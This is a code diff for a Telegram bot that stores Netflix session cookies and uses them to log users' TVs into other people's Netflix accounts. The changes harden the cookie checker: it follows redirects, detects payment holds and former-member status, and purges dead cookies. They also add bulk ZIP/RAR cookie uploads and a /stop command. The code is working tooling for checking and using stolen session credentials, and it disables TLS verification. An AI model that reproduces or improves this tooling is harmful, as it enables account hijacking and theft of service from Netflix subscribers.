@@ -76,9 +76,13 @@ REQUIRED_CHANNELS = [{
     "invite_link": "https://t.me/XeronLab",
 }]
 
-REQUEST_TIMEOUT = 15
+# Increased timeout to prevent Render network timeout errors
+REQUEST_TIMEOUT = 25
 MAX_USAGE_PER_COOKIE = 2
 MAX_COOKIES_TO_TRY = 3
+
+# GLOBAL CANCELLATION FLAG FOR /stop
+stop_requested = False
 
 # ========== MONGODB SETUP ==========
 MONGO_URI = os.environ.get("MONGO_URI")
@@ -327,7 +331,7 @@ async def check_force_join(
     return True
 
 
-# ========== COOKIE EXTRACTION & ADVANCED VALIDATION ==========
+# ========== COOKIE EXTRACTION & ACCURATE VALIDATION ==========
 def extract_netflix_id_from_text(text: str) -> Optional[str]:
     match = re.search(r"netflixid\s*=\s*([^\s;]+)", text, re.IGNORECASE)
     if match:
@@ -363,41 +367,75 @@ def extract_netflix_id_from_text(text: str) -> Optional[str]:
 
 
 def check_if_cookie_alive(netflix_id: str) -> Tuple[bool, str]:
-    """Validates if cookie is active, paid, and not on hold."""
+    """Validates if cookie is active, paid, and not on hold without following redirects."""
     session = requests.Session()
     session.cookies.set("NetflixId", netflix_id, domain=".netflix.com", path="/")
-    headers = {
-        "User-Agent": BASE_HEADERS["User-Agent"],
-        "Accept": BASE_HEADERS["Accept"],
-        "Accept-Encoding": BASE_HEADERS["Accept-Encoding"],
-        "Accept-Language": BASE_HEADERS["Accept-Language"],
-        "Referer": "https://www.netflix.com/",
-    }
+    headers = BASE_HEADERS.copy()
+    headers["Referer"] = "https://www.netflix.com/"
+
     try:
+        # Step 1: Catch redirects to /login immediately
         r = session.get(
+            "https://www.netflix.com/YourAccount",
+            headers=headers,
+            timeout=REQUEST_TIMEOUT,
+            verify=False,
+            allow_redirects=False,
+        )
+
+        if r.status_code in (301, 302, 303, 307, 308):
+            redirect_target = r.headers.get("Location", "").lower()
+            if "login" in redirect_target or "signup" in redirect_target:
+                return False, "Dead/Expired Cookie"
+
+        # Step 2: Fetch membership details
+        r2 = session.get(
             "https://www.netflix.com/account/membership",
             headers=headers,
-            timeout=10,
+            timeout=REQUEST_TIMEOUT,
             verify=False,
+            allow_redirects=True,
         )
-        if r.status_code != 200 or "currentCountry" not in r.text:
+
+        if r2.status_code != 200:
+            return False, f"HTTP {r2.status_code} Error"
+
+        html = r2.text
+        lower_html = html.lower()
+
+        if "/login" in r2.url.lower() or ("sign in" in lower_html and "password" in lower_html):
             return False, "Dead/Expired Cookie"
 
-        lower_text = r.text.lower()
-        if (
-            "payment on hold" in lower_text
-            or "update your payment information" in lower_text
-            or "membership holds" in lower_text
-        ):
+        # Step 3: Payment Hold check
+        hold_indicators = [
+            "payment on hold",
+            "update your payment information",
+            "membership holds",
+            "hold_context",
+            '"accountstatus":"hold"',
+        ]
+        if any(indicator in lower_html for indicator in hold_indicators):
             return False, "Payment On Hold"
 
-        if "free plan" in lower_text or "no active plan" in lower_text:
+        # Step 4: Free Plan check
+        inactive_indicators = [
+            "free plan",
+            "no active plan",
+            "restart your membership",
+            '"accountstatus":"former_member"',
+            '"accountstatus":"never_member"',
+        ]
+        if any(indicator in lower_html for indicator in inactive_indicators):
             return False, "Free/Inactive Plan"
 
+        if "currentcountry" not in lower_html and "countryofsignup" not in lower_html:
+            return False, "Invalid Account Structure"
+
         return True, "OK"
+
     except Exception as e:
         logger.warning(f"Cookie check error for {netflix_id[:15]}: {e}")
-        return False, "Connection Error"
+        return False, "Connection Timeout"
 
 
 # ========== TV ACTIVATION USING /tv2 API ==========
@@ -552,7 +590,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await safe_reply(
         update.message,
         "𝕎𝔼𝕃ℂ𝕆𝕄𝔼 𝕋𝕆 ℕ𝔼𝕋𝔽𝕃𝕀𝕏 𝕋𝕍 𝕃𝕆𝔾𝕀ℕ 𝔹𝕆𝕋!\n\n"
-        "⚡𝗜𝗡𝗦𝗧𝗔𝗡𝗧𝗟𝗬 𝗟𝗢𝗚𝗜𝗡⚡\n⚡𝗠𝗜𝗫 𝗣𝗟𝗔𝗡 𝗟𝗢𝗚𝗜𝗡⚡\n\n"
+        "⚡𝗜𝗡𝗦𝗧𝗔𝗡𝗧𝗟𝗬 𝗟𝗢𝗚𝕀ℕ⚡\n⚡𝗠𝗜𝗫 𝗣𝗟𝗔𝗡 𝗟𝗢𝗚𝕀ℕ⚡\n\n"
         "𝗠𝗔𝗗𝗘 𝗕𝗬 𝗫𝗘𝗥𝗢𝗡 @𝘅𝗶𝘅𝘄𝘃",
     )
 
@@ -608,6 +646,16 @@ async def channels_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await safe_reply(update.message, "❌ Could not fetch channels.")
 
 
+async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Admin command to immediately stop any active bulk check."""
+    global stop_requested
+    if update.effective_user.id not in ADMIN_IDS:
+        await safe_reply(update.message, "⛔ Admins only.")
+        return
+    stop_requested = True
+    await safe_reply(update.message, "🛑 **Stop signal sent!** Stopping current bulk operations...")
+
+
 async def login_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         register_user(update.effective_user.id)
@@ -640,7 +688,7 @@ async def login_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not all_cookies:
         await safe_reply(
             update.message,
-            "𝗡𝗢 𝗖𝗢𝗢𝗞𝗜𝗘𝗦 𝗔𝗩𝗔𝗜𝗟𝗔𝗕𝗟𝗘 𝗖𝗨𝗥𝗥𝗘𝗡𝗧𝗟𝗬!\n\n"
+            "𝗡𝗢 𝗖𝗢𝗢𝗞𝗜𝗘𝗦 𝗔𝗩𝗔𝗜𝗟𝗔𝗕𝗟𝗘 𝗖𝗨𝗥𝗥𝗘𝗡𝗧🇱𝗬!\n\n"
             "𝗣𝗹𝗲𝗮𝘀𝗲 𝗧𝗥𝗬 𝗟𝗮𝘁𝗲𝗿!\n\n"
             " 𝗠𝗔𝗗𝗘 𝗕𝗬 𝗫𝗘𝗥𝗢𝗡 @𝘅𝗶𝘅𝘄𝘃",
         )
@@ -662,7 +710,6 @@ async def login_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     for cookie_entry in cookies_to_try:
         netflix_id = cookie_entry["NetflixId"]
 
-        # Run blocking HTTP request asynchronously
         ok, final_url, cleaned, err_msg, status = await asyncio.to_thread(
             submit_tv_code, netflix_id, tv_code
         )
@@ -678,7 +725,7 @@ async def login_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
             success_text = (
                 "⚡𝐘𝐎𝐔𝐑 𝐓𝐕 𝐇𝐀𝐒 𝐁𝐄𝐄𝐍 𝐋𝐎𝐆𝐆𝐄𝐃 𝐈𝐍 𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘!⚡\n\n"
-                f"ℂ𝕆𝕌ℕ𝕋ℝ𝕐:❮{country.upper()}❯     ┃  "
+                f"ℂ𝕆𝕌ℕ𝕋ℝℝ𝕐:❮{country.upper()}❯     ┃  "
                 f" ℙ𝕃𝔸ℕ:❮{plan.upper()}❯\n\n"
                 "𝗠𝗔𝗗𝗘 𝗕𝗬 𝗫𝗘𝗥𝗢𝗡 @𝘅𝗶𝘅𝘄𝘃"
             )
@@ -715,21 +762,25 @@ async def login_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 # ========== ADMIN /RECHECK & BROADCAST COMMAND ==========
 async def recheck_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global stop_requested
     if update.effective_user.id not in ADMIN_IDS:
         await safe_reply(update.message, "⛔ Admins only.")
         return
 
+    stop_requested = False
     all_users = get_all_known_user_ids()
     maintenance_notice = "⚠️𝖧𝖮𝖴𝖱𝖫𝖸 𝖵𝖠𝖴𝖫𝖳 𝖬𝖠𝖨𝖭𝖳𝖤𝖭𝖠𝖭𝖢𝖤"
-    
+
     await safe_reply(update.message, f"📢 Broadcasting maintenance alert to {len(all_users)} users...")
-    
+
     success_broadcast = 0
     for uid in all_users:
+        if stop_requested:
+            break
         try:
             await context.bot.send_message(chat_id=uid, text=maintenance_notice)
             success_broadcast += 1
-            await asyncio.sleep(0.05)  # Telegram API rate limit guard
+            await asyncio.sleep(0.05)
         except Exception:
             pass
 
@@ -751,24 +802,28 @@ async def recheck_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     last_edit_time = time.time()
 
     def check_task(cookie_entry):
+        if stop_requested:
+            return cookie_entry, None, "Stopped"
         netflix_id = cookie_entry["NetflixId"]
         is_alive, reason = check_if_cookie_alive(netflix_id)
         return cookie_entry, is_alive, reason
 
-    with ThreadPoolExecutor(max_workers=5) as executor:
+    # Lowered concurrency (max_workers=3) to fix Render timeouts
+    with ThreadPoolExecutor(max_workers=3) as executor:
         futures = [executor.submit(check_task, c) for c in all_cookies]
         for future in futures:
+            if stop_requested:
+                break
             entry, is_alive, reason = future.result()
             checked += 1
 
-            if not is_alive:
+            if is_alive is False:
                 remove_cookie_by_netflixid_global(entry["NetflixId"])
                 removed_count += 1
                 logger.info(f"Recheck purged {entry['filename']}: {reason}")
-            else:
+            elif is_alive is True:
                 retained_count += 1
 
-            # Time-Lock Guard: Only edit message if 1.5+ seconds passed or at the end
             current_time = time.time()
             if (current_time - last_edit_time >= 1.5) or (checked == total):
                 try:
@@ -782,8 +837,9 @@ async def recheck_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 except Exception:
                     pass
 
+    status_prefix = "🛑 **Vault Maintenance Stopped!**" if stop_requested else "✅ **Vault Maintenance Completed!**"
     await status_msg.edit_text(
-        "✅ **Vault Maintenance Completed!**\n\n"
+        f"{status_prefix}\n\n"
         f"👥 **Users Notified:** `{success_broadcast}`\n"
         f"🟢 **Alive Cookies Retained:** `{retained_count}`\n"
         f"🗑️ **Dead Cookies Cleaned:** `{removed_count}`",
@@ -868,8 +924,10 @@ async def del_cookie(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await safe_reply(update.message, "❌ Cookie not found or you don't own it.")
 
 
-# ========== FILE HANDLER WITH TIME-LOCKED PROGRESS ==========
+# ========== FILE HANDLER WITH AUTO-DETECTION & CANCELLATION ==========
 def process_single_cookie_task(fname: str, content: str, admin_id: int):
+    if stop_requested:
+        return False, "Stopped"
     netflix_id = extract_netflix_id_from_text(content)
     if not netflix_id:
         return False, "No NetflixId"
@@ -883,6 +941,7 @@ def process_single_cookie_task(fname: str, content: str, admin_id: int):
 
 
 async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global stop_requested
     user = update.effective_user
     if user.id not in ADMIN_IDS:
         await safe_reply(update.message, "⛔ Only admins can add cookies.")
@@ -892,22 +951,20 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     file_name = document.file_name.lower()
 
-    if document.file_size > 5 * 1024 * 1024:
+    if document.file_size > 15 * 1024 * 1024:
         await safe_reply(
-            update.message, "❌ File too large (max 5 MB)."
+            update.message, "❌ File too large (max 15 MB)."
         )
         return
 
     status_msg = await safe_reply(
-        update.message, "📥 Downloading and checking cookie validity..."
+        update.message, "📥 Downloading and checking file..."
     )
 
-    if context.user_data.get("awaiting_single_file"):
-        context.user_data.pop("awaiting_single_file")
-        if not (file_name.endswith(".txt") or file_name.endswith(".json")):
-            await status_msg.edit_text("❌ Only .txt or .json files are accepted.")
-            return
+    stop_requested = False
 
+    # Auto-detection for single .txt or .json files
+    if file_name.endswith((".txt", ".json")):
         file = await context.bot.get_file(document.file_id)
         file_bytes = await file.download_as_bytearray()
         content = file_bytes.decode("utf-8", errors="ignore")
@@ -938,14 +995,8 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await status_msg.edit_text("⚠️ Cookie already exists in storage.")
         return
 
-    if context.user_data.get("awaiting_bulk_file"):
-        context.user_data.pop("awaiting_bulk_file")
-        if not (
-            file_name.endswith(".zip") or (RAR_SUPPORT and file_name.endswith(".rar"))
-        ):
-            await status_msg.edit_text("❌ Please upload a .zip or .rar file.")
-            return
-
+    # Auto-detection for .zip or .rar files
+    if file_name.endswith(".zip") or (RAR_SUPPORT and file_name.endswith(".rar")):
         await status_msg.edit_text("📦 Extracting archive...")
         file = await context.bot.get_file(document.file_id)
         raw_data = await file.download_as_bytearray()
@@ -973,13 +1024,15 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         processed = 0
         last_edit_time = time.time()
 
-        # Parallel execution with Time-Lock guard for 100+ files
-        with ThreadPoolExecutor(max_workers=5) as executor:
+        # Lowered workers (3 threads) to avoid CPU bottleneck timeouts
+        with ThreadPoolExecutor(max_workers=3) as executor:
             futures = [
                 executor.submit(process_single_cookie_task, fname, content, user.id)
                 for fname, content in files_to_process
             ]
             for future in futures:
+                if stop_requested:
+                    break
                 ok, res = future.result()
                 processed += 1
                 if ok:
@@ -989,21 +1042,22 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 else:
                     dead += 1
 
-                # Time-Lock Guard: Only update UI if 1.5+ seconds elapsed or at final file
                 current_time = time.time()
                 if (current_time - last_edit_time >= 1.5) or (processed == total_files):
                     try:
                         await status_msg.edit_text(
                             f"⏳ **Checking Cookies:** `{processed}/{total_files}`\n\n"
-                            f"🟢 **Alive:** `{added}` | 🔴 **Dead:** `{dead}` | ⚠️ **Dupes:** `{dupes}`",
+                            f"🟢 **Alive:** `{added}` | 🔴 **Dead:** `{dead}` | ⚠️ **Dupes:** `{dupes}`\n\n"
+                            f"🛑 Send /stop to cancel.",
                             parse_mode="Markdown"
                         )
                         last_edit_time = current_time
                     except Exception:
                         pass
 
+        status_prefix = "🛑 **Bulk Upload Stopped!**" if stop_requested else "✅ **Bulk Upload Finished!**"
         await status_msg.edit_text(
-            "✅ **Bulk Upload Finished!**\n\n"
+            f"{status_prefix}\n\n"
             f"🟢 **Alive Added:** `{added}`\n"
             f"🔴 **Rejected/Dead:** `{dead}`\n"
             f"⚠️ **Duplicates:** `{dupes}`",
@@ -1011,7 +1065,7 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
 
-    await safe_reply(update.message, "Use /addsingle or /bulkadd first.")
+    await status_msg.edit_text("❌ Unsupported file format. Please upload a .txt, .json, .zip, or .rar file.")
 
 
 # ========== SET COMMANDS ==========
@@ -1027,6 +1081,7 @@ async def set_commands(app: Application):
         BotCommand("addsingle", "Add a single cookie"),
         BotCommand("bulkadd", "Add ZIP/RAR of cookies"),
         BotCommand("recheck", "Recheck DB & broadcast notice"),
+        BotCommand("stop", "Stop active bulk checking"),
         BotCommand("listcookies", "Show all cookies"),
         BotCommand("delcookie", "Delete a cookie"),
         BotCommand("delall", "Delete all cookies"),
@@ -1053,6 +1108,7 @@ def main():
     app.add_handler(CommandHandler("addsingle", addsingle_command))
     app.add_handler(CommandHandler("bulkadd", bulkadd_command))
     app.add_handler(CommandHandler("recheck", recheck_command))
+    app.add_handler(CommandHandler("stop", stop_command))
     app.add_handler(CommandHandler("delall", delall_command))
     app.add_handler(CommandHandler("delall_confirm", delall_confirm))
     app.add_handler(CommandHandler("listcookies", list_cookies))
@@ -1067,3 +1123,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+       
